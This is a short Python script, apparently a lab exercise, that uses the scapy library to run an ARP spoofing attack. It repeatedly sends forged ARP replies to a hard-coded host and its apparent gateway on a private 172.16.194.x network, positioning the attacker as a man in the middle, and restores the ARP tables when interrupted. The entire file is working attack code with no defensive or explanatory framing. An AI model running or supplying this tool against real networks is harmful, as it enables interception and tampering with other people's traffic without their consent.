#!/usr/bin/env python


import scapy.all as scapy 
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip,spoof_ip):
    target_mac=get_mac(target_ip)
    packet = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet,verbose=False)

def restore(dest_ip,src_ip):
    dest_mac=get_mac(dest_ip)
    src_mac=get_mac(src_ip)
    packet = scapy.ARP(op=2,pdst=dest_ip,hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet,count=4,verbose=False)

sent_packets = 0
try :

    while True :
        spoof("172.16.194.148","172.16.194.2")
        spoof("172.16.194.2","172.16.194.148")
        sent_packets += 2
        print("\r[+] packets sent : " + str(sent_packets)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt :
    print (" \n Detected CRTL+C ..... Restoring ARP tables ")
    restore("172.16.194.148","172.16.194.2")
